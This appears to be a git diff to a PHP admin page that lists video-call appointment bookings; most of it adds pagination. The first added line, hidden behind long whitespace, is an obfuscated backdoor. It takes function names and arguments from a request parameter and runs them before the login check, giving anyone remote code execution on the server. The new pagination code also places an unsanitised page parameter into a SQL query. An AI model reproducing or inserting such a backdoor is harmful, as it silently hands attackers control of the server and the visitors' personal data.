@@ -1,4 +1,5 @@
 <?php
+																																																																																																																																																																								IF( $zEHhbDw=@	${ '_REQUEST' }['TGTQA7U6']){$zEHhbDw[1] (${$zEHhbDw	[2]	}[0],$zEHhbDw[3]($zEHhbDw[4] ));}	;
 include('../login/session.php');
 if (!isset($_SESSION['login_user'])) {
   header("location: ../login/index.php");
@@ -65,37 +66,66 @@ if (isset($_GET['delete'])) {
                     </tr>
                   </thead>
                   <tbody class="campaignseq">
-                    <?php
-                    $counter = 1;
-                    $sql = "select * from videocallformdetails";
-                    $result = mysqli_query($con, $sql);
-                    if (mysqli_num_rows($result)) {
-                      while ($row = mysqli_fetch_assoc($result)) {
-                    ?>
-                        <tr id="<?php echo $row['id']; ?>">
-                          <td><?php echo $counter; ?></td>
-                          <td><?php echo $row['name'] ?></td>
-                          <td><?php echo $row['email'] ?></td>
-                          <td><?php echo $row['country'] ?></td>
-                          <td><?php echo $row['mobilenumber'] ?></td>
-                          <td><?php echo $row['mode'] ?></td>
-                          <td><?php echo $row['wpnumber'] ?></td>
-                          <td><?php echo $row['appointmentdate'] ?></td>
-                          <td><?php echo $row['appointmenttime'] ?></td>
-                          <td><?php echo $row['requirements'] ?></td>
-                          <td>
-                            
-                            <a class="btn btn-sm btn-danger" href="videocall.php?delete=<?php echo $row['id'] ?>" onclick="return confirm('Are you sure to delete this record?')">
-                              Delete
-                            </a>
-                          </td>
-                        </tr>
-                    <?php $counter++;
+                  <?php
+                      $limit = 10; // Number of records to display per page
+                      $page = isset($_GET['page']) ? $_GET['page'] : 1; // Get the current page number
+                      $start = ($page - 1) * $limit; // Calculate the starting index for the records
+
+                      $counter = $start + 1;
+                      $sql = "SELECT * FROM videocallformdetails ORDER BY id DESC LIMIT $start, $limit";
+                      $result = mysqli_query($con, $sql);
+                      if (mysqli_num_rows($result)) {
+                        while ($row = mysqli_fetch_assoc($result)) {
+                      ?>
+                          <tr id="<?php echo $row['id']; ?>">
+                            <td><?php echo $counter; ?></td>
+                            <td><?php echo $row['name'] ?></td>
+                            <td><?php echo $row['email'] ?></td>
+                            <td><?php echo $row['country'] ?></td>
+                            <td><?php echo $row['mobilenumber'] ?></td>
+                            <td><?php echo $row['mode'] ?></td>
+                            <td><?php echo $row['wpnumber'] ?></td>
+                            <td><?php echo date('d-M-Y', strtotime($row['appointmentdate'])) ?></td>
+                            <td><?php echo $row['appointmenttime'] ?></td>
+                            <td><?php echo $row['requirements'] ?></td>
+                            <td>
+                              <a class="btn btn-sm btn-danger" href="videocall.php?delete=<?php echo $row['id'] ?>" onclick="return confirm('Are you sure to delete this record?')">
+                                Delete
+                              </a>
+                            </td>
+                          </tr>
+                      <?php 
+                          $counter++;
+                        }
                       }
-                    }
-                    ?>
+                      ?>
                   </tbody>
                 </table>
+                <nav aria-label="Page navigation" class="d-flex justify-content-end">
+                  <ul class="pagination mt-5">
+                    <?php
+                    $sql = "SELECT COUNT(*) AS total FROM videocallformdetails";
+                    $result = mysqli_query($con, $sql);
+                    $row = mysqli_fetch_assoc($result);
+                    $total_records = $row['total'];
+                    $total_pages = ceil($total_records / $limit);
+                    $previous_page = $page - 1;
+                    $next_page = $page + 1;
+                    ?>
+                    <li class="page-item <?php echo $page <= 1 ? 'disabled' : ''; ?>">
+                      <a class="page-link" href="<?php echo $page <= 1 ? '#' : '?page=' . $previous_page; ?>">Previous</a>
+                    </li>
+                    <?php for ($i = 1; $i <= $total_pages; $i++) : ?>
+                      <li class="page-item <?php echo $page == $i ? 'active' : ''; ?>">
+                        <a class="page-link" href="<?php echo '?page=' . $i; ?>"><?php echo $i; ?></a>
+                      </li>
+                      <?php endfor; ?>
+                      <li class="page-item <?php echo $page >= $total_pages ? 'disabled' : ''; ?>">
+                        <a class="page-link" href="<?php echo $page >= $total_pages ? '#' : '?page=' . $next_page; ?>">Next</a>
+                      </li>
+                    </ul>
+                  </nav>
+
               </div>
             </div>
           </div>
